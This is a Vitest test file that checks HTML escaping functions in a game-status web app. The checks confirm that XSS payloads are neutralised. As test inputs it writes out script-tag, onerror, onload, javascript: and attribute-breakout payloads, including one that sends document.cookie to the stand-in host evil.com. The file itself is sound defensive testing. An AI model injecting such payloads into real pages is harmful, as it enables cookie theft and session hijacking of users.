/**
 * Tests for XSS Prevention in HTTP HTML Generation
 *
 * Verifies that the escapeHtml and generateHtmlPage functions properly
 * prevent XSS attacks as addressed in Issue #12.
 *
 * Key security requirements tested:
 * - All HTML special characters are properly escaped
 * - Script injection attempts are neutralized
 * - Generated HTML pages do not contain unescaped user input
 * - Event handler injection is prevented
 *
 * @module http.xss.test
 */
import { describe, it, expect } from "vitest";
import { escapeHtml, generateHtmlPage } from "../http";

describe("XSS Prevention (Issue #12 Fix)", () => {
  describe("escapeHtml", () => {
    it("should escape ampersand characters", () => {
      expect(escapeHtml("Tom & Jerry")).toBe("Tom &amp; Jerry");
      expect(escapeHtml("&")).toBe("&amp;");
      expect(escapeHtml("&&&&")).toBe("&amp;&amp;&amp;&amp;");
    });

    it("should escape less than characters", () => {
      expect(escapeHtml("1 < 2")).toBe("1 &lt; 2");
      expect(escapeHtml("<")).toBe("&lt;");
      expect(escapeHtml("<<<")).toBe("&lt;&lt;&lt;");
    });

    it("should escape greater than characters", () => {
      expect(escapeHtml("2 > 1")).toBe("2 &gt; 1");
      expect(escapeHtml(">")).toBe("&gt;");
      expect(escapeHtml(">>>")).toBe("&gt;&gt;&gt;");
    });

    it("should escape double quote characters", () => {
      expect(escapeHtml('Say "hello"')).toBe("Say &quot;hello&quot;");
      expect(escapeHtml('"')).toBe("&quot;");
      expect(escapeHtml('"""')).toBe("&quot;&quot;&quot;");
    });

    it("should escape single quote characters", () => {
      expect(escapeHtml("It's fine")).toBe("It&#039;s fine");
      expect(escapeHtml("'")).toBe("&#039;");
      expect(escapeHtml("'''")).toBe("&#039;&#039;&#039;");
    });

    it("should escape all HTML special characters in combination", () => {
      expect(escapeHtml('<script>alert("XSS")</script>')).toBe(
        "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;"
      );
      expect(escapeHtml("a < b && b > c")).toBe("a &lt; b &amp;&amp; b &gt; c");
    });

    it("should return empty string for empty input", () => {
      expect(escapeHtml("")).toBe("");
    });

    it("should not modify strings without special characters", () => {
      expect(escapeHtml("Hello World")).toBe("Hello World");
      expect(escapeHtml("123456")).toBe("123456");
      expect(escapeHtml("normal text")).toBe("normal text");
    });

    it("should handle unicode characters correctly", () => {
      expect(escapeHtml("Hello 世界")).toBe("Hello 世界");
      expect(escapeHtml("Café & Résumé")).toBe("Café &amp; Résumé");
      expect(escapeHtml("🎮 < 🎲")).toBe("🎮 &lt; 🎲");
    });
  });

  describe("XSS Attack Vectors", () => {
    it("should neutralize script tag injection", () => {
      const malicious = '<script>alert("XSS")</script>';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain("<script>");
      expect(escaped).not.toContain("</script>");
      expect(escaped).toBe(
        "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;"
      );
    });

    it("should neutralize img tag with onerror handler", () => {
      const malicious = '<img src=x onerror="alert(\'XSS\')">';
      const escaped = escapeHtml(malicious);
      // The < and > are escaped, preventing HTML tag creation
      expect(escaped).not.toContain("<img");
      expect(escaped).toContain("&lt;img");
      expect(escaped).toBe(
        "&lt;img src=x onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;"
      );
    });

    it("should neutralize SVG-based XSS", () => {
      const malicious =
        '<svg onload="alert(\'XSS\')"><circle cx="50" cy="50" r="40"/></svg>';
      const escaped = escapeHtml(malicious);
      // The < and > are escaped, preventing SVG tag creation
      expect(escaped).not.toContain("<svg");
      expect(escaped).toContain("&lt;svg");
    });

    it("should neutralize javascript: protocol in href", () => {
      const malicious = '<a href="javascript:alert(\'XSS\')">Click</a>';
      const escaped = escapeHtml(malicious);
      // The < and > are escaped, preventing anchor tag creation
      expect(escaped).not.toContain("<a");
      expect(escaped).toContain("&lt;a");
    });

    it("should neutralize event handler injection", () => {
      const malicious = '" onmouseover="alert(\'XSS\')" data-x="';
      const escaped = escapeHtml(malicious);
      // The quotes are escaped, preventing attribute breakout
      expect(escaped).not.toContain('"');
      expect(escaped).toContain("&quot;");
      expect(escaped).toBe(
        "&quot; onmouseover=&quot;alert(&#039;XSS&#039;)&quot; data-x=&quot;"
      );
    });

    it("should neutralize data: protocol XSS", () => {
      const malicious =
        '<object data="data:text/html,<script>alert(\'XSS\')</script>">';
      const escaped = escapeHtml(malicious);
      expect(escaped).not.toContain("<object");
      expect(escaped).not.toContain("<script>");
    });

    it("should neutralize HTML entity bypass attempts", () => {
      // Some attackers try to use HTML entities to bypass filters
      const malicious = "&lt;script&gt;alert('XSS')&lt;/script&gt;";
      const escaped = escapeHtml(malicious);
      // The & should be escaped, preventing entity interpretation
      expect(escaped).toBe(
        "&amp;lt;script&amp;gt;alert(&#039;XSS&#039;)&amp;lt;/script&amp;gt;"
      );
    });

    it("should neutralize template literal injection", () => {
      const malicious = "${alert('XSS')}";
      const escaped = escapeHtml(malicious);
      // Template literals aren't HTML injection but verify no modification
      expect(escaped).toBe("${alert(&#039;XSS&#039;)}");
    });
  });

  describe("generateHtmlPage", () => {
    it("should escape title in generated HTML", () => {
      const html = generateHtmlPage(
        '<script>alert("XSS")</script>',
        "Test message",
        true
      );
      expect(html).not.toContain('<script>alert("XSS")</script>');
      expect(html).toContain(
        "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;"
      );
    });

    it("should escape message in generated HTML", () => {
      const html = generateHtmlPage(
        "Test Title",
        '<img src=x onerror="alert(\'XSS\')">',
        false
      );
      expect(html).not.toContain('<img src=x onerror="alert(\'XSS\')">');
      expect(html).toContain(
        "&lt;img src=x onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;"
      );
    });

    it("should escape both title and message simultaneously", () => {
      const html = generateHtmlPage(
        "<script>alert(1)</script>",
        "<script>alert(2)</script>",
        true
      );
      expect(html).not.toContain("<script>");
      // Both should be escaped
      expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
      expect(html).toContain("&lt;script&gt;alert(2)&lt;/script&gt;");
    });

    it("should generate valid HTML structure", () => {
      const html = generateHtmlPage("Test Title", "Test message", true);
      expect(html).toContain("<!DOCTYPE html>");
      expect(html).toContain("<html lang=\"en\">");
      expect(html).toContain("<title>Test Title - GameStatus</title>");
      expect(html).toContain("<h1>Test Title</h1>");
      expect(html).toContain("<p>Test message</p>");
      expect(html).toContain("</html>");
    });

    it("should use success styling for success=true", () => {
      const html = generateHtmlPage("Success", "Operation completed", true);
      // Success color is #10b981
      expect(html).toContain("#10b981");
      // Should contain checkmark SVG path
      expect(html).toContain("M22 11.08V12a10 10 0 1 1-5.93-9.14");
    });

    it("should use error styling for success=false", () => {
      const html = generateHtmlPage("Error", "Operation failed", false);
      // Error color is #ef4444
      expect(html).toContain("#ef4444");
      // Should contain error icon SVG elements
      expect(html).toContain('cx="12" cy="12" r="10"');
    });

    it("should include back to dashboard link", () => {
      const html = generateHtmlPage("Test", "Message", true);
      expect(html).toContain('href="/"');
      expect(html).toContain("Go to Dashboard");
    });

    it("should handle special characters in legitimate content", () => {
      const html = generateHtmlPage(
        "Tom & Jerry's Game",
        'Status: "Online" > Threshold',
        true
      );
      expect(html).toContain("Tom &amp; Jerry&#039;s Game");
      expect(html).toContain(
        "Status: &quot;Online&quot; &gt; Threshold"
      );
    });
  });
});

describe("XSS Vulnerability Regression Tests (Issue #12)", () => {
  it("should prevent reflected XSS through title parameter", () => {
    // Simulate malicious input that could come from URL parameter
    const maliciousTitle =
      '"><script>document.location="http://evil.com/?c="+document.cookie</script>';
    const html = generateHtmlPage(maliciousTitle, "Normal message", true);

    // Verify the script tag is escaped, not executed
    expect(html).not.toContain(
      '"><script>document.location="http://evil.com'
    );
    expect(html).toContain("&quot;&gt;&lt;script&gt;");
  });

  it("should prevent stored XSS through message parameter", () => {
    // Simulate malicious content that could be stored in database
    const maliciousMessage =
      '<iframe src="http://evil.com/steal.html"></iframe>';
    const html = generateHtmlPage("Title", maliciousMessage, false);

    expect(html).not.toContain("<iframe");
    expect(html).toContain("&lt;iframe");
  });

  it("should prevent DOM-based XSS via event handlers", () => {
    const maliciousTitle = '" onclick="alert(\'XSS\')" style="';
    const html = generateHtmlPage(maliciousTitle, "Message", true);

    // Verify onclick is escaped
    expect(html).not.toContain('onclick="alert');
    expect(html).toContain("onclick=&quot;alert");
  });

  it("should prevent XSS through HTML attribute injection", () => {
    // Attempt to break out of attribute context
    const malicious = '"></h1><script>alert("XSS")</script><h1 class="';
    const html = generateHtmlPage(malicious, "Message", true);

    // Verify the HTML structure is not broken
    expect(html).not.toContain('"></h1><script>');
    expect(html).toContain("&quot;&gt;&lt;/h1&gt;&lt;script&gt;");
  });

  it("should handle null bytes and other control characters", () => {
    // Some XSS bypasses use null bytes
    const malicious = "<script\x00>alert('XSS')</script>";
    const html = generateHtmlPage("Title", malicious, true);

    // The < and > should still be escaped
    expect(html).toContain("&lt;script");
    expect(html).toContain("&lt;/script&gt;");
  });

  it("should prevent XSS in title tag context", () => {
    // Title tag XSS has special considerations
    const malicious = "</title><script>alert('XSS')</script><title>";
    const html = generateHtmlPage(malicious, "Message", true);

    expect(html).not.toContain("</title><script>");
    expect(html).toContain("&lt;/title&gt;&lt;script&gt;");
  });
});

describe("escapeHtml Edge Cases", () => {
  it("should handle very long strings", () => {
    const longString = "<script>".repeat(1000);
    const escaped = escapeHtml(longString);
    expect(escaped).toBe("&lt;script&gt;".repeat(1000));
  });

  it("should handle strings with only special characters", () => {
    expect(escapeHtml("<>&\"'")).toBe("&lt;&gt;&amp;&quot;&#039;");
  });

  it("should handle mixed content with newlines", () => {
    const multiline = '<script>\nalert("XSS")\n</script>';
    const escaped = escapeHtml(multiline);
    expect(escaped).toBe(
      "&lt;script&gt;\nalert(&quot;XSS&quot;)\n&lt;/script&gt;"
    );
  });

  it("should handle whitespace-only strings", () => {
    expect(escapeHtml("   ")).toBe("   ");
    expect(escapeHtml("\t\n\r")).toBe("\t\n\r");
  });

  it("should handle numbers as strings", () => {
    expect(escapeHtml("12345")).toBe("12345");
    expect(escapeHtml("3 > 2 && 2 > 1")).toBe("3 &gt; 2 &amp;&amp; 2 &gt; 1");
  });
});
